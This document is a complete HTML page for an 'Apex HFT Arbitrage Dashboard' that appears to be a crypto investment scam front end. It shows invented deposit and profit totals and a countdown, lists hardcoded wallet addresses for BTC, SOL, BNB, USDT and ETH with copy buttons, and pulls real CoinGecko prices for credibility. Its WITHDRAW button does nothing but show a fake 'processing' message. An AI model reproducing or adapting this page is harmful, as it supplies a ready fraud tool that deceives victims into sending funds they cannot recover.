<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apex HFT Arbitrage Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .ticker-animate { animation: scroll 20s linear infinite; }
    </style>
</head>
<body class="bg-gray-950 text-white min-h-screen p-4 md:p-8">

    <!-- Ticker -->
    <div class="overflow-hidden bg-blue-900/30 py-2 mb-8 rounded-lg border border-blue-800">
        <div class="ticker-animate whitespace-nowrap text-blue-300 font-semibold">
            Thank you for joining our arbitrage program.
        </div>
    </div>

    <div class="max-w-4xl mx-auto">
        <!-- Stats Row -->
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
            <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 text-center">
                <div class="text-xs text-gray-500 uppercase">Total Deposit</div>
                <div class="text-xl font-bold text-green-400">$12,450.00</div>
            </div>
            <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 text-center">
                <div class="text-xs text-gray-500 uppercase">Profit</div>
                <div class="text-xl font-bold text-blue-400">$1,280.50</div>
            </div>
            <div class="col-span-2 bg-gray-900 p-4 rounded-xl border border-gray-800 text-center">
                <div class="text-xs text-gray-500 uppercase">Cycle Countdown</div>
                <div id="countdown" class="text-xl font-mono font-bold text-yellow-400">72:00:00</div>
            </div>
        </div>

        <!-- Live Prices -->
        <div id="price-card" class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
            <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 text-center animate-pulse">Loading Market Data...</div>
        </div>

        <!-- Withdraw Button -->
        <div class="my-12 text-center">
            <button onclick="showModal()" class="bg-blue-600 hover:bg-blue-500 transition px-12 py-6 rounded-2xl text-2xl font-bold w-full md:w-auto shadow-lg shadow-blue-900/20">
                WITHDRAW
            </button>
        </div>

        <!-- Deposit Section -->
        <div class="bg-gray-900 p-6 rounded-2xl border border-gray-800">
            <h2 class="text-xl font-semibold mb-6">Deposit Addresses</h2>
            <div class="space-y-4" id="address-list">
                <!-- BTC, SOL, BNB, USDT, ETH -->
            </div>
        </div>
    </div>

    <!-- Modal -->
    <div id="modal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4">
        <div class="bg-gray-900 p-8 rounded-2xl border border-gray-700 max-w-sm text-center">
            <h3 class="text-xl font-bold mb-4">Processing</h3>
            <p class="text-gray-400 mb-6">Request processing... Please check your email for confirmation.</p>
            <button onclick="hideModal()" class="bg-blue-600 px-6 py-2 rounded-lg">Close</button>
        </div>
    </div>

    <script>
        let previousPrices = {};
        const assets = [
            { id: 'btc', name: 'BTC', addr: 'bc1q3ucw3ddh8cszq63n5nesghnyluc2gkrsnq39ws' },
            { id: 'sol', name: 'SOL', addr: '8jVF1ZxNK3RD96BazJDQqvJWYMWi3WJ5U3ESSt4hUXBc' },
            { id: 'bnb', name: 'BNB', addr: '0xA18d7A53655f5fa110dd7D17A33FA1Ff8fc2Ef55' },
            { id: 'usdt', name: 'USDT (TRX)', addr: 'TQhRGzipWiT8dy4smU4EbK5TzLCTgHzB5W' },
            { id: 'eth', name: 'ETH', addr: '0xA18d7A53655f5fa110dd7D17A33FA1Ff8fc2Ef55' }
        ];

        // Render Addresses
        const list = document.getElementById('address-list');
        assets.forEach(a => {
            list.innerHTML += `
                <div class="flex justify-between items-center p-4 bg-gray-950 rounded-lg border border-gray-800">
                    <div><span class="font-bold">${a.name}:</span> <span class="text-sm font-mono text-gray-400 break-all ml-2" id="${a.id}">${a.addr}</span></div>
                    <button onclick="copy('${a.id}')" class="bg-gray-800 px-3 py-1 rounded hover:bg-gray-700 text-sm transition" id="btn-${a.id}">Copy</button>
                </div>`;
        });

        async function fetchPrices() {
            try {
                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,solana,binancecoin,ethereum,tether&vs_currencies=usd');
                const data = await res.json();
                const map = { bitcoin: 'BTC', solana: 'SOL', binancecoin: 'BNB', ethereum: 'ETH' };
                const container = document.getElementById('price-card');
                container.innerHTML = '';
                
                Object.keys(map).forEach(key => {
                    const price = data[key].usd;
                    const color = previousPrices[key] > price ? 'text-red-500' : (previousPrices[key] < price ? 'text-green-500' : 'text-white');
                    container.innerHTML += `
                        <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 text-center">
                            <div class="text-xs text-gray-500">${map[key]}</div>
                            <div class="font-bold ${color}">$${price.toLocaleString()}</div>
                        </div>`;
                    previousPrices[key] = price;
                });
            } catch (e) { console.error(e); }
        }

        function copy(id) {
            const text = document.getElementById(id).innerText;
            navigator.clipboard.writeText(text);
            const btn = document.getElementById('btn-' + id);
            btn.innerText = 'Copied!';
            btn.classList.add('bg-green-800');
            setTimeout(() => { btn.innerText = 'Copy'; btn.classList.remove('bg-green-800'); }, 2000);
        }

        // Countdown
        let time = 72 * 60 * 60;
        function updateCountdown() {
            const h = Math.floor(time / 3600);
            const m = Math.floor((time % 3600) / 60);
            const s = time % 60;
            document.getElementById('countdown').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            if(time > 0) time--;
        }

        function showModal() { document.getElementById('modal').classList.remove('hidden'); }
        function hideModal() { document.getElementById('modal').classList.add('hidden'); }

        setInterval(fetchPrices, 10000);
        setInterval(updateCountdown, 1000);
        fetchPrices();
    </script>
</body>
</html>
